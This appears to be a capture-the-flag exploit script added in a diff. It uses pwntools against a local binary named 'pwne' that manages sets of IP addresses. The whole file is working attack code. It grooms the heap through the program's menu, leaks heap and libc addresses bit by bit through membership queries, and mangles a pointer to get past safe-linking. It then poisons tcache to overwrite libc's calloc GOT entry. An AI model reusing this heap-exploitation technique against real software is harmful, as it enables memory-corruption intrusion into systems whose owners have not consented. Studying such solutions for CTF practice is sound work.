@@ -1,0 +1,183 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+import socket
+import sys
+# from z3 import Int, Solver, LShR
+import ipaddress
+
+import numpy as np
+from scipy.optimize import fsolve
+
+warnings.filterwarnings("ignore")
+exe = ELF("./pwne")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.35.so")
+# context.log_level='debug'
+# p = remote("addr", 1337)
+p = process([exe.path])
+def GDB(): 
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               decompiler connect ida
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def convert_ip(ip_address: str) -> int:
+    try:
+        # Convert the IP address to binary form
+        packed_ip = socket.inet_aton(ip_address)
+        # Unpack it as an unsigned integer in network byte order and convert to host byte order
+        return int.from_bytes(packed_ip, byteorder='big')
+    except socket.error:
+        # Exit with error code -1 if conversion fails
+        sys.exit(-1)
+def create_set(start, end):
+    sla(":", "1")
+    sla(":", start)
+    sla(":", end)
+def add_ip(ip):
+    sla(":", "2")
+    sla(":", ip)
+def del_ip(ip):
+    sla(":","3")
+    sla(":", ip)
+def free():
+    sla(":", "5")
+
+def add(size, start_str = "0.0.0.0"):
+    start = convert_ip(start_str)
+    heap_size = size
+    end = start + (heap_size - 1) * 8
+    end_str = socket.inet_ntoa(struct.pack('!I', end))
+    create_set(start_str, end_str)
+    return start_str, end_str
+def query(ip):
+    sla(":","4")
+    sla(":", ip)
+    result = p.recvline()
+    if result.startswith(b"IP is in the set"):
+        return 1
+    else:
+        return 0
+def show(idx):
+    bit = []
+    bit_str = "0b"
+    range_bit = (idx + 1) * 64
+    for i in range(range_bit):
+        bit.append(str(query(f"0.0.0.{i}")))
+    for i in range(len(bit)):
+        bit_str += bit[len(bit) - i - 1]
+    return eval(bit_str)
+def num2ip(num):
+    return socket.inet_ntoa(struct.pack('!I', num))
+def clear(idx):
+    for i in range(idx * 64, idx * 64 + 64):
+        del_ip(num2ip(i))
+def write(idx, val, mask = ""):
+    # write each bit
+    bins = format(val, "b")
+    size = 1
+    bin_arr = [int(bins[i:i + size]) for i in range(0, len(bins), size)]
+    bin_arr.reverse()
+    i = 0
+    for item in bin_arr:
+        ip_str = num2ip(i + idx * 64)+ ("" if mask == "" else "/" + mask)
+        log.info(f"{ip_str = }")
+        if item == 1:
+            add_ip(ip_str)
+        else:
+            del_ip(ip_str)
+        i += 1
+    return bin_arr
+def protect(ptr1,ptr2):
+    return ptr1^(ptr2>>12)
+start, end = add(0x20)# offset adjustment
+start, end = add(0x10) # offset adjustment
+log.info(f"start: {start}")
+log.info(f"end: {end}")
+free()
+add(0x40)
+free()
+add(0x40) # get heap pointer
+# ip = "0.0.0.5"
+ip = "0.0.0.33"
+heap = show(0) << 12
+log.info(f"{hex(heap) = }")
+add(0x30)
+free()
+add(0x40)
+add(0x50)
+free()
+add(0x60)
+free()
+add(0x70)
+free()
+ip = f"0.255.255.60"
+start, end = add(0x28, ip)
+add_ip(f"{ip}/20")
+add(0x100)
+add(0x90)
+add(0x10)
+add(0x10)
+ip = f"0.255.255.55"
+add(0x300, ip)
+del_ip(f"{ip}/19")
+
+for i in range(14):
+    add(0x1000,"0.0.0.0")
+add(0x960)
+add(0x20)
+add(0x30)
+free()
+add(0x30)
+addr = show(0)
+log.info(f"{hex(addr) = }")
+libc.address = addr - 0x21b450
+log.info(f"{hex(libc.address) = }")
+free()
+ip = f"255.255.0.0"
+add(0x40)
+free()
+add(0x140)
+free()
+ip = f"0.255.255.60"
+start, end = add(0x28, ip)
+add_ip(f"{ip}/20")
+ip = f"0.255.255.55"
+add(0x100)
+add(0x90)
+add(0x10)
+add(0x300, ip)
+del_ip(f"{ip}/19")
+for i in range(45):
+    add(0x500)
+add(0x500)
+add(0x160)
+add(0x30)
+free()
+add(0x100)
+write(17, 0x61)
+free()
+add(0x140)
+free()
+add(0x100)
+write(18, protect(libc.got.calloc, heap + 0x3d0))
+add(0x50)
+add(0x50)
+call = 0xdeadbeef
+write(0, call)
+GDB()
+
+# free()
+
+p.interactive()
+# good luck pwning :)
+
